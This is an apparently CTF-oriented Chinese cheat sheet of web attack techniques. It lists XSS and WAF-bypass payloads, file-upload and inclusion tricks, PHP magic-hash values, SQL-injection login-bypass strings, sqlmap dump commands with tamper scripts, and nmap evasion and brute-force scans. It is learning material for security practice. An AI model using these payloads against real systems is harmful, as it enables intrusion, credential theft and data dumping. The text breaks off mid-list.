##### 字符拼接

利用eval

```html
<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">
```

利用top

```html
<script>top["al"+"ert"](`xss`);</script>
```

##### 其它字符混淆

有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了
下面举几个简单的例子

```html
可利用注释、标签的优先级等
1.<<script>alert("xss");//<</script>
2.<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
3.<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>
```

##### 编码绕过

Unicode编码绕过

```html
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">

<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">
```

url编码绕过

```html
<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
```

Ascii码绕过

```html
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
```

hex绕过

```html
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
```

八进制

```html
<img src=x onerror=alert('\170\163\163')>
```

base64绕过

```html
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```

##### 过滤双引号，单引号

1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号

```html
<img src="x" onerror=alert(`xss`);>
```

2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了



#### 过滤url地址

**使用url编码**

```html
<img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>
```

**使用IP**

1.十进制IP

```html
<img src="x" onerror=document.location=`http://2130706433/`>
```

2.八进制IP

```html
<img src="x" onerror=document.location=`http://0177.0.0.01/`>
```

3.hex

```html
<img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
```

4.html标签中用`//`可以代替`http://`

```html
<img src="x" onerror=document.location=`//www.baidu.com`>
```

5.使用`\\`

```html
但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议
```



解码顺序是先进行html解码，在进行javascript解码，最后再进行url解码



利用link远程包含js文件

**PS：在无CSP的情况下才可以**

```html
<link rel=import href="http://127.0.0.1/1.js">
```



当括号被过滤的时候可以使用throw来绕过

```html
<a onmouseover="javascript:window.onerror=alert;throw 1>
<img src=x onerror="javascript:window.onerror=alert;throw 1">
```

还可以用 `` 反引号

```html
alert`1`
`${alert(1)}`
\u{0000000000000061}lert(1)
```

没了引号

```html
<script>alert(/adkddfasdffaasdfa/)</script>
```





当 = ( ) ; : 被过滤时

```html
<svg><script>alert&#40/1/&#41</script> // 通杀所有浏览器
```



### prompt(1) to win




### alert(1) to win

## 代码审计

工具：

+   rips
+   seay
+   githack
+   stings, grep

思路：

+ 敏感函数回溯参数过程
+ 通读全文代码
+ 根据功能点定向审计

### Java struts2 系列



## SSRF

[原链接](https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51) [改编](http://n3k0sec.top/2018/06/24/PHP-SSRF%E7%BB%95%E8%BF%87tricks/)

```php
<?php
   echo "Argument: ".$argv[1]."\n";
   // check if argument is a valid URL
   if(filter_var($argv[1], FILTER_VALIDATE_URL)) {
      // parse URL
      $r = parse_url($argv[1]);
      print_r($r);
      // check if host ends with google.com
      if(preg_match('/google\.com$/', $r['host'])) {
         // get page from URL
         exec('curl -v -s "'.$r['host'].'"', $a);
         print_r($a);
      } else {
         echo "Error: Host not allowed";
      }
   } else {
      echo "Error: Invalid URL";
   }
?>
```



## 文件操作

### 上传

### 包含

l   .user.ini 搭配 图片或其他

l   .htaccess

l   php://filter/read=convert.base64-encode/resource=files/images/xxx/resource=files/xxx

l   php3 php5 phtml 

l   zip协议,phar协议

l   %00截断只适合php5.3及以前

l   mt_rand() 可以爆破seed进行预测 工具是 php_mt_seed

l  通过php文件包含自己可以造成死循环，此前tmp下生成的临时文件不被删除，可以爆破tmp文件结合文件包含当成webshell

l  利用phpinfo查看session文件在tmp下的文件名，再迅速的利用文件包含，即可成为webshell

l  file_put_contents第二个参数可以为一维数组，输出时是将数组的元素进行拼接。

l  在return 中可以执行命令，利用"${phpinfo()}" 这样形式的，在return之前会优先执行解析

l  windows关于php读取文件函数的文件匹配很有趣。常见的可以用<<>等字符进行通配



### upload-labs

https://github.com/c0ny1/upload-labs.git

- Apache 解析

`phpshell.php.rar.rar.rar.rar` 因为 Apache 不认识 `.rar` 这个文件类型，所以会一直遍历后缀到 `.php`，然后认为这是一个 PHP 文件。

- IIS 解析

IIS 6 下当文件名为 `abc.asp;xx.jpg` 时，会将其解析为 `abc.asp`。

- PHP CGI 路径解析

当访问 `http://www.a.com/path/test.jpg/notexist.php` 时，会将 `test.jpg` 当做 PHP 解析， `notexist.php` 是不存在的文件。此时 Nginx 的配置如下

```
location ~ \.php$ {
  root html;
  fastcgi_pass 127.0.0.1:9000;
  fastcgi_index index.php;
  fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
  include fastcgi_param;
}
```

+   基于前端 JS 的验证

    firebug 修改一下 JS 文件

+ 基于文件后缀名的绕过

    后缀名大小写混用

    空格，加点，加下划线，双重后缀名，叠用 phphpp

    PHP345，.inc, .phtml, .phpt, .phps

    %00截断：name=test.jpg0x00

    ​		   1.php%00.png

    ​		   1.aspchr(0)&XXX.jpg,chr(0)

    ​		    /1.php，在1.php前加个空格，在hex中找到20再改为00

    .htaccess(文件重写)：

    ```
    <FilesMatch "95zz.gif">
    SetHandler application/x-httpd-php
    </FilesMatch>
    ```

+   基于文件类型的检测

    Content-Type : Multipart/form-data; 大小写绕过

+   在线编辑器漏洞

+   文件包含

+ 基于文件头部信息的过滤

    ```shell
    copy xx.png+xxx.php out.jpg  # win下的命令
    ```

思路：

+   简单的上传文件，查看响应

+   是否只是前端过滤后缀名、文件格式，抓包绕过

+   是否存在截断上传漏洞

+   是否对文件头检测(图片马等等)

+   是否对内容进行了检测

+   是否上传吗被查杀，免杀

+   是否存在各种解析漏洞

+   http头以两个 CRLF(相当于\r\n\r\n作为结尾)，当 \r\n 没有被过滤时，

    可以利用 \r\n\r\n 作为 url 参数的截断，后面跟上注入代码

## PHP 特性

**类型：**

+   弱类型
+   intval
+   strpos 和 ===
+   反序列化 + destruct
+   \0 截断
+   iconv 截断
+   parse_str()
+   伪协议

在线调试环境：http://www.shucunwang.com/RunCode/php

**思路：**

+   判断是否存在 PHP 中截断特性

+   查看源码，判断是否存在 PHP 弱类型问题

+   查看源码，注意一些特殊函数，eval(), system(), intval()

+   构造变量，获取flag

+   是否存在 HPP

+   魔法哈希 0e开头，sha1(), md5()无法处理数组

    如果要找出 `0e` 开头的 hash 碰撞，可以用如下代码

    ```php
    <?php
     
    $salt = 'vunp';
    $hash = '0e612198634316944013585621061115';
     
    for ($i=1; $i<100000000000; $i++) {
        if (md5($salt . $i) == $hash) {
            echo $i;
            break;
        }
    }
     
    echo 'done';
    ```

    常见的payload:

    ==md5==

    QNKCDZO
0e830400451993494058024219903391
    s155964671a
0e342768416822451524974117254469
    s214587387a
0e848240448830537924465865611904
    s878926199a
0e545993274517709034328855841020
    s1091221200a
0e940624217856561557816327384675
    s1885207154a
0e509367213418206700842008763514
    s1836677006a
0e481036490867661113260034900752
    s1184209335a
0e072485820392773389523109082030
    s1665632922a
0e73119806149116307319712
    s1502113478a
0e861580163291561247404381396064
    s532378020a
0e220463095855511507588041205815
    

==sha1==	
    10932435112: 0e07766915004133176347055865026311692244
aaroZmOk: 0e66507019969427134894567494305185566735
aaK1STfY: 0e76658526655756207688271159624026011393
aaO8zKZF: 0e89257456677279068558073954252716165668
    aa3OFF9m: 0e36977786278517984959260394024281014729

    ==crc32==
    
    6586: 0e817678
    
    两个 md5 一样的字符串
    
    ```python
from binascii import unhexlify
    from hashlib import md5
from future.moves.urllib.parse import quote
    
input1 = 'Oded Goldreich\nOded Goldreich\nOded Goldreich\nOded Go' + unhexlify(
    'd8050d0019bb9318924caa96dce35cb835b349e144e98c50c22cf461244a4064bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf67c12978647f5af123de3acf844085cd025b956')

    print(quote(input1))
    print md5(input1).hexdigest()
    
    input2 = 'Neal Koblitz\nNeal Koblitz\nNeal Koblitz\nNeal Koblitz\n' + unhexlify('75b80e0035f3d2c909af1baddce35cb835b349e144e88c50c22cf461244a40e4bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf6fc11978647f5af123de3acf84408dcd025b956')
    print md5(input2).hexdigest()
    print(quote(input2))
```
    
另外一组 md5 一样的字符串
    
​```python
    from array import array
from hashlib import md5
    input1 = array('I', [0x6165300e,0x87a79a55,0xf7c60bd0,0x34febd0b,0x6503cf04,0x854f709e,0xfb0fc034,0x874c9c65,0x2f94cc40,0x15a12deb,0x5c15f4a3,0x490786bb,0x6d658673,0xa4341f7d,0x8fd75920,0xefd18d5a])
    input2 = array('I', [x^y for x,y in zip(input1, [0, 0, 0, 0, 0, 1<<10, 0, 0, 0, 0, 1<<31, 0, 0, 0, 0, 0])])
    print(input1 == input2) # False
    print(md5(input1).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41
    print(md5(input2).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41
```

**伪协议**

+ php://filter – 对本地磁盘文件进行读写

  查看源码：file=php://filter/read=convert.base64-encode/resource=index.php

+ php://input 伪协议需要服务器支持，同时要求 allow_url_include = on

  fn=php://input，然后再 post 一个 fn=xx

+ php://output 是一个只写的数据流，允许我们以 print 和 echo 一样的方式写入到输出缓冲区

+ php://memory 总是把数据存储在内存中

+ php://temp 会在内存量达到预定义的限制后(默认2M)存入临时文件中

+ data://

DATA伪协议，分号和逗号有争议

+   data:,文本数据
+   data:text/plain ,文本数据
+   data:text/html,HTML代码
+   data:text/css;base64,css代码
+   data:text/javascript;base64,javascript代码
+   data:image/x-icon;base64,base64编码的 icon 图片数据
+   data:image/gif;base64,base64编码的gif图片数据
+   data:image/png;base64,base64编码的png图片数据
+   data:image/jpeg;base64,base64编码的png图片数据

zip://

把1.php文件压缩成.zip，再把后缀改成png，上传上去

```php
?file=zip://1.png%231.php
// ?file=zip://1.zip%231.php
```



>   glob:// 查找匹配的文件路径模式



**文件操作相关**

```php
// 列出目录
scandir('/xxx')  // . 当前目录 .. 上级目录 / 根目录
    
// 输出文件内容
show_source('flag.php');
highlight_file('flag.php');
var_dump(file('flag.php'));  // 以下两个以数组形式输出
print_r(file('flag.php'));

// 读取文件内容
file_get_contents('flag.php');
file_get_contents('http://www.baidu.com')  // 读取远程内容，可用作爬虫
    
获取当前文件所在目录:
1.print_r(getcwd()); 
2.print_r(dirname(__FILE__));

获取当前文件目录(包含本身文件名):
print_r(__FILE__);

遍历当前目录的文件:
1.print_r(scandir(getcwd())); 
2.print_r(scandir(dirname(__FILE__))); 
3.print_r(glob("*"))

遍历当前目录的前目录的文件:
print_r(scandir(dirname(__FILE__) . "/../"));
打开文件:show_source('flag.php');
删除文件:unlink('neko.php');
是否存在变量:var_dump(getenv('neko'));
设置变量:putenv('neko=runa');
```





## 后台登录类

**类型：**

+   各种万能密码绕过
+   变形的万能密码绕过
+   社工的方式得到后台密码
+   爆破的方式得到后台密码
+   各种 cms 后台登陆绕过

```shell
# asp万能密码
'or'='or'

# aspx万能密码
1： "or "a"="a
2： ')or('a'='a
3：or 1=1--
4：'or 1=1--
5：a'or' 1=1--
6： "or 1=1--
7：'or'a'='a
8： "or"="a'='a
9：'or''='
10：'or'='or'
11: 1 or '1'='1'=1
12: 1 or '1'='1' or 1=1
13: 'OR 1=1%00
14: "or 1=1%00
15: 'xor
16: 新型万能登陆密码
username: ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）
passwd: 1
Username=-1%cf' union select 1,1,1 as password,1,1,1 %23
Password=1
17..admin' or 'a'='a 密码随便

# PHP万能密码
'or'='or'
'or 1=1/*  字符型 GPC是否开都可以使用
User: something
Pass: ' OR '1'='1

# jsp 万能密码
1'or'1'='1
admin' OR 1=1/*
用户名：admin （系统存在此用户)
密码：1'or'1'='1
```



**思路：**

+   根据提示，判断是否是普通的登陆绕过，或是利用社工的方式
+   普通登陆绕过尝试各种万能密码绕过，或通过普通的 sql 注入漏洞得到账号密码，或 xss 盲打，sqlmap注入
+   如果是 cms 系统登陆，查看是否有相应版本的后台绕过漏洞
+   如果是社工方式，谷歌，百度，社工库
+   爆破获取
+   robots.txt 找找后台

## 加解密

**类型：**

+   简单的编码(多次 base64 编码)
+   密码题(hash 长度扩展、异或、移位加密各种变形)
+   js 加解密
+   根据加密源码写解密脚本

**思路：**

+   判断是编码还是加密
+   如果是编码，判断编码类型，尝试解码或多次解码
+   如果是加密，判断是现有的加密算法，还是自写的加密算法
+   是否是对称加密，是否存在秘钥泄露等，获取秘钥解密
+   根据加密算法，推断出解密算法

## 流量分析

## 命令执行

#### 直接执行代码

PHP 中有不少可以直接执行代码的函数。

```php
eval();
assert();
system();
exec();
shell_exec();
passthru();
escapeshellcmd();
pcntl_exec();
```

#### preg_replace( ) 代码执行

preg_replace() 的第一个参数如果存在 `/e` 模式修饰符，则允许代码执行。

```php
<?php
    $var = "<tag>phpinfo()</tag>";
	preg_replace("/<tag>(.*?)<\/tag>/e", "addslashes(\\1)", $var);
?>
```

若无 `/e` 修饰符，则可以尝试 %00 截断。

[继续学习](https://ctf-wiki.github.io/ctf-wiki/web/php/php/)

## 其他

脑洞题

**类型：**

+   爆破，包括MD5、爆随机数、验证码识别

+   社工，花式查社工库、微博、QQ签名、whois、谷歌  [天涯社工库](www.findmima.com)

+   SSRF，包括花式探测端口、302跳转、花式协议利用、gophar直接去shell等等

+   协议，花式IP伪造X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA、

    花式藏FLAG、花式分析数据包

    X-Forwarded-For简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。

    标准格式如下：X-Forwarded-For: client1, proxy1, proxy2

+   XXE，各种 XML 存在地方(rss/word/流媒体)、各种XXE利用方法(文件读取)

## 工具

### Burp Suite

+ Proxy

    拦截 HTTP /S 的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。

+ Spider

    应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。

+ Scanner

    一个高级的工具，执行后，它能自动地发现 web应用程序的安全漏洞。

+ Intruder

    高度可配置的工具，对 web 应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用 fuzzing 技术探测常规漏洞。

+ Repeater

    靠手动操作来补发单独的 HTTP请求，并分析应用程序响应的工具。

+ Sequencer

    用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。

+ Decoder

    进行手动执行或对应用程序数据者智能解码编码的工具。

+ Comparer

    通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。 

```shell
cupp -i  # 加入社工信息，生成特有字典
proxy -> history  # 找到登录信息
Send to intruder
clear§  # 清楚所有§
add§  # 在需要爆破的地方加§
payloads -> load... # 导入字典
options -> number of threads  # 设置多线程
start attack  # 观察状态码和长度
```

若 Burp 无法抓取 DVWA 等本地包，代理设置中删除 `不使用代理` ：localhost,127.0.0.1即可


[最强手册](<https://momomoxiaoxi.com/2016/01/06/sqlmap-help/>)

```shell
# 检查注入点：
sqlmap -u http://aa.com/star_photo.php?artist_id＝11

# 爆当前数据库信息：
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 --current-db

# 指定库名列出所有表
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 --tables

# 指定库名表名列出所有字段
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin --columns

# 指定库名表名字段dump出指定字段
sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password --dump  ('ac,id,password' 为指定字段名称)
```

**参数解释**

```
--data
使用post方式提交的时候，就需要用到data参数了

-p
当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间

--level
不同的level等级，SQLMAP所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。

--random-agent
使用该参数，SQLMAP会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent

--technique
这个参数可以指定SQLMAP使用的探测技术，默认情况下会测试所有的方式。
支持的探测方式如下：
B: Boolean-based blind SQL injection（布尔型注入）
E: Error-based SQL injection（报错型注入）
U: UNION query SQL injection（可联合查询注入）
S: Stacked queries SQL injection（可多语句查询注入）
T: Time-based blind SQL injection（基于时间延迟注入）
```

**Access注入**

```
sqlmap -u 注入点url //判断是否有注入

sqlmap -u 注入点url --tables //access直接猜表

sqlmap -u 注入点url  --colums -T admin //爆出admin表，猜解它的字段

sqlmap -u 注入点url  --dump -T admin -C "username,password"  //猜字段内容
```

**Cookie 注入**

网站有判断，不让用and,update等参数时就得加上Cookie。

```
sqlmap -u url --cookie="cookie值" --dbs(或)--tables --level 2
```

**POST表单注入**

注入点：

```
http://testasp.vulnweb.com/Login.asp 
```

**几种方式：**

```shell
sqlmap -r burp拦截数据.txt  # 从文件读取数据包，注入点用 * 替换

sqlmap -u http://testasp.vulnweb.com/Login.asp  --forms 

sqlmap -u http://testasp.vulnweb.com/Login.asp  --data "Name=1&Pass=1"  # 手动添加数据
```

**伪静态注入**

```
sqpmap  -u http://victim.com/id/666*.html --dbs  //在html扩展名前加个'*'
```

**请求延时**

Web防注入措施，在访问两次错误页面后，第三次必须访问正确的页面

```
--delay 2 //延时两秒访问

--safe-freq 30  //人为配置次数
```

**Tamper**

DIY 部分，最具可玩性的地方。

基本注入语句是一样的，可不同的网站过滤规则不一样，此时就需要编写Tamper进行本地化。

+   框架

```python
# sqlmap/tamper/escapequotes.py

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOWEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    return payload.replace("'", "\\'").replace('"', '\\"')

'''
priority 表示脚本的优先级，用于有多个脚本的情况
'''
```

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    data = '''{"admin_user":"admin%s","admin_pass":65};'''
    payload = payload.lower()
    payload = payload.replace('u', 'u0075')
    payload = payload.replace('o', 'u006f')
    payload = payload.replace('i', 'u0069')
    payload = payload.replace(''', 'u0027')
    payload = payload.replace('"', 'u0022')
    payload = payload.replace(' ', 'u0020')
    payload = payload.replace('s', 'u0073')
    payload = payload.replace('#', 'u0023')
    payload = payload.replace('>', 'u003e')
    payload = payload.replace('<', 'u003c')
    payload = payload.replace('-', 'u002d')
    payload = payload.replace('=', 'u003d')
    return data % payload
```

+   tamper()

返回处理后的 payload

例如服务器上有这么几行代码

```php
$id = trim($POST($id),'union');
$sql="SELECT * FROM users WHERE id='$id'";
```

而我们的payload为

```
-8363'  union select null -- -
```

这里union被过滤掉了，将导致payload不能正常执行，那么就可以编写这样的tamper

```python
def tamper(payload, **kwargs):
    return payload.replace('union','uniounionn')
```

保存为replaceunion.py，放到sqlmap/tamper/下

执行的时候带上 --tamper=replaceunion 的参数，就可以绕过该过滤规则

[官方tamper](https://blog.csdn.net/hxsstar/article/details/22782627)

+   dependencies()

声明脚本的适用/不适用范围，可为空

```python
sqlmap/tamper/echarunicodeencode.py

from lib.core.common import singleTimeWarnMessage

def dependencies():
singleTimeWarnMessage("tamper script '%s' is only meant to be run against ASP or ASP.NET web applications" % os.path.basename(__file__).split(".")[0])

# singleTimeWarnMessage() 用于在控制台中打印出警告信息
```

+   kwargs

在官方提供的47个tamper脚本中，kwargs参数只被使用了两次，两次都只是更改了http-header，这里以其中一个为例进行简单说明

```
# sqlmap/tamper/vanrish.py

def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    headers["X-originating-IP"] = "127.0.0.1"
    return payload
```

这个脚本是为了更改 X-originating-IP，以绕过WAF，另一个 kwargs 的使用出现于 xforwardedfor.py，也是为了改 header 以绕过 waf

+   部分常数值

```python
# sqlmap/lib/enums.py

class PRIORITY:
    LOWEST = -100
    LOWER = -50
    LOW = -10
    NORMAL = 0
    HIGH = 10
    HIGHER = 50
    HIGHEST = 100

class DBMS:
    ACCESS = "Microsoft Access"
    DB2 = "IBM DB2"
    FIREBIRD = "Firebird"
    MAXDB = "SAP MaxDB"
    MSSQL = "Microsoft SQL Server"
    MYSQL = "MySQL"
    ORACLE = "Oracle"
    PGSQL = "PostgreSQL"
    SQLITE = "SQLite"
    SYBASE = "Sybase"
    HSQLDB = "HSQLDB"
```

### nosqlmap

### nmap

急速扫描大量主机，为什么要扫描大网络空间呢？ 有这样的情形：

1. 内网渗透   攻击者单点突破，进入内网后，需进一步扩大成果，可以先扫描整个私有网络空间，发现哪些主机是有利用价值的，例如 10.1.1.1/8, 172.16.1.1/12, 192.168.1.1/16
2. 全网扫描

扫描一个巨大的网络空间，我们最关心的是效率问题，即时间成本。 在足够迅速的前提下，宁可牺牲掉一些准确性。扫描的基本思路是高并发地 `ping`：

```shell
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml www.hackliu.com/16

-sn    不扫描端口，只ping主机

-PE   通过ICMP echo判定主机是否存活

-n     不反向解析IP地址到域名

–min-hostgroup 1024    最小分组设置为1024个IP地址，当IP太多时，nmap需要分组，然后串行扫描

–min-parallelism 1024  这个参数非常关键，为了充分利用系统和网络资源，我们将探针的数目限定最小为1024

-oX nmap_output.xml    将结果以XML格式输出，文件名为nmap_output.xml

一旦扫描结束，解析 XML文档即可得到哪些 IP 地址是存活的。
```

测试扫描 www.hackliu.com/16 这B段，65535个IP地址（存活10156），耗时112.03秒

#### 一、主机发现

```shell
1. 全面扫描/综合扫描
nmap -A 192.168.1.103

2. Ping扫描
nmap -sP 192.168.1.1/24

3. 免Ping扫描，穿透防火墙，避免被防火墙发现
nmap -P0 192.168.1.103

4. TCP SYN Ping 扫描
nmap -PS -v 192.168.1.103
nmap -PS80,10-100 -v 192.168.1.103 （针对防火墙丢弃RST包）

5. TCP ACK Ping 扫描
nmap -PA -v 192.168.1.103

6. UDP Ping 扫描
nmap -PU -v 192.168.1.103

7. ICMP Ping Types 扫描
nmap -PU -v 192.168.1.103    (ICMP ECHO)
nmap -PP -v 192.168.1.103    (ICMP 时间戳)
nmap -PM -v 192.168.1.103    (ICMP 地址掩码)

8. ARP Ping 扫描
nmap -PR -v 192.168.1.103

9. 列表 扫描
nmap -sL -v 192.168.1.103

10. 禁止方向域名解析
nmap -n -sL -v 192.168.1.103

11. 方向域名解析
nmap -R -sL -v 192.168.1.103

12. 使用系统域名解析系统
nmap --system-dns 192.168.1.2 192.168.1.103

13. 扫描IPV6地址
nmap -6 IPv6

14. 路由跟踪
nmap --traceroute -v www.sunbridgegroup.com

15. SCTP INIT Ping 扫描
nmap -PY -v 192.168.1.103
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647
```

#### 二、端口扫描

```shell
1. 时序扫描
nmap -T(0-5) 192.168.1.103

2. 常用扫描方式
nmap -p 80 192.168.1.103
nmap -p 80-100 192.168.1.103
nmap -p T:80,U:445 192.168.1.103
nmap -F 192.168.1.1.103    (快速扫描)
nmap --top-ports 100 192.168.1.103    (扫描最有用的前100个端口)

3. TCP SYN 扫描 （高效的扫描方式）[半开链接扫描]
nmap -sS -v 192.168.1.103

4. TCP 连接扫描[全连接扫描]
nmap -sT -v 192.168.1.103

5. UDP 连接扫描
nmap -sU -p 80-100 192.168.1.103

6. 隐蔽扫描
nmap -sN 61.241.194.153(NULL扫描)
nmap -sF 61.241.194.153(FIN扫描)
nmap -sX 61.241.194.153(Xmas扫描)

7. TCP ACK 扫描
nmap -sA 192.168.1.103

8. TCP 窗口扫描
nmap -sW -v -F  192.168.1.103

9. TCP Maimon 扫描
nmap -sM -T4  192.168.1.103

10. 自定义 扫描
nmap -sT --scanflags SYNURG 192.168.1.103

11. 空闲 扫描( 隐藏IP )
nmap -sI www.0day.co:80 192.168.1.103

12. IP协议 扫描
nmap -sO -T4 192.168.1.103
```

#### 三、指纹识别与探测

```shell
1. 版本探测（显示banner信息）
nmap -sV 192.168.1.103
nmap -sV -A 192.168.1.103

2. 全端口版本探测
nmap -sV --allports 192.168.1.103

3. 设置扫描强度
nmap -sV --version-intensity (0-9) 192.168.1.103

4. 轻量级扫描
nmap -sV --version-light 2 192.168.1.103

5. 重量级扫描
nmap -sV --version-all 192.168.1.103

6. 获取详细版本信息
nmap -sV --version-trace 192.168.1.103

7. RPC扫描
nmap -sS -sR 192.168.1.103

8. 对指定的目标进行操作系统监测
nmap -O --osscan-limit 192.168.1.103

9. 推测系统并识别
nmap -O --osscan-guess 192.168.1.103
```

#### 四、伺机而动

```shell
1. 调整并行扫描组的大小
nmap --min-hostgroup 30 192.168.1.110/24
nmap --max-hostgroup 30 902 192.168.1.104

2. 调整探测报文的并行度
nmap --min-parallelism 100 192.168.1.104
nmap --max-parallelism 100 192.168.1.104

3. 调整探测报文超时
nmap --initial-rtt-timeout 100ms 192.168.1.104
nmap --max-rtt-timeout 100ms 192.168.1.104
nmap --min-rtt-timeout 100ms 192.168.1.104

4. 放弃缓慢的目标主机
nmap --host-timeout 1800000ms 192.168.1.104

5. 调整报文适合时间间隔
nmap --scan-delay 1s 192.168.1.104
nmap --max-scan-delay 1s 192.168.1.104
12345678910111213141516171819
```

#### 五、防火墙/IDS逃逸

```shell
1. 报文分段
nmap -f -v 61.241.194.153

2. 指定偏移大小
nmap --mtu 16 192.168.1.104

3. IP欺骗
nmap -D RND:11 192.168.1.104
nmap -D 192.168.1.104,192.168.1.103,192.168.1.101 192.168.1.104

4. 源地址欺骗
nmap -sI www.0day.cn:80 192.168.1.104

5. 源端口欺骗
nmap --source-port 902 192.168.1.104

6. 指定发包长度
nmap --data-length 30 192.168.1.104

7. 目标主机随机排序
nmap --randomize-hosts 192.168.1.104

8. MAX地址欺骗
nmap -sT -Pn --spoof-mac 0 192.168.1.104
123456789101112131415161718192021222324
```

#### 六、信息收集

```shell
1. IP信息收集
nmap --script ip-geolocation-* www.pcos.cn

2. WHOIS 查询
nmap --script whois-domain www.pcos.cn
nmap --script whois-domain --script-args whois.whodb=nofollow www.ithome.com
nmap -sn --script whois-domain -v -iL host.txt

3. 搜索邮件信息(新版可能没有这个模块)
nmap --script http-email-harvest www.pcos.cn

4. IP反查
nmap -sn --script hostmap-ip2hosts www.pcos.cn

5. DNS信息收集
nmap --script dns-brute www.pcos.cn
nmap --script dns-brute dns-brute.threads=10 www.pcos.cn
nmap --script dns-brute dns-brute.threads=10,dns-brute.hostlis www.pcos.cn

6. 检索系统信息
nmap -p 445 445 192.168.1.104 --script membase-http-info

7. 后台打印机服务漏洞
nmap --script smb-security-mode.nse -p 445 119.29.155.45

8. 系统漏洞扫描
nmap --script smb-check-vulns.nse -p 445 119.29.155.45

9.扫描Web漏洞
nmap -p80 --script http-stored-xss.nse/http-sql-injection.nse 119.29.155.45

10. 通过 Snmp 列举 Windows 服务/账户
nmap -sU -p 161 --script=snmp-win32-services 192.168.1.104
nmap -sU -f -p 161 --script=snmp-win32-users 192.168.1.110

11. 枚举 DNS 服务器的主机名
nmap --script dns-brute --script-args dns-brute.domain=baidu.com

12. HTTP信息收集
nmap -sV -p 80 www.0day.com (HTTP版本探测)
nmap -p 80 --script=http-headers www.pcos.cn (HTTP信息头探测)
nmap -p 80 --script=http-sitemap-generator www.pcos.cn (爬行Web目录结构)

13. 枚举SSL密钥
nmap -p 443 --script=ssl-enum-ciphers www.baidu.com

14. SSH服务密钥信息探测
map -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 127.0.0.1
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748
```

#### 七、数据库渗透测试

```shell
1. Mysql列举数据库
nmap -p3306 --script=mysql-databases --script-args mysqluser=root,mysqlpass 192.168.1.101

2. 列举 MySQL 变量
nmap -p3306 --script=mysql-variables 192.168.1.3
nmap -sV --script=mysql-variables 192.168.1.3 (无法确定端口的情况下)

3. 检查 MySQL 密码
nmap -p3306 --script=mysql-empty-password 192.168.1.3
nmap -sV -F -T4 --script=mysql-empty-password 192.168.1.3

4. 审计 MySQL 密码
nmap --script=mysql-brute 192.168.1.101
nmap -p3306 --script=mysql-brute userdb=/root/passdb.txt passdb=/root/pass.txt 192.168.1.101 (指定字典)

5. 审计 MySQL 安全配置
nmap -p3306 --script mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='123',mysql-audit.filename='nselib/data/mysql-cis.audit'" 192.168.1.104

6. 审计 Oracle 密码
nmap --script=oracle-brute -p 1521 --script-args oracle-brute.sid=test 192.168.1.121
nmap --script=oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=/tmp/usernames.txt,passdb=/tmp/password.txt 192.168.1.105

7. 审计 msSQL密码
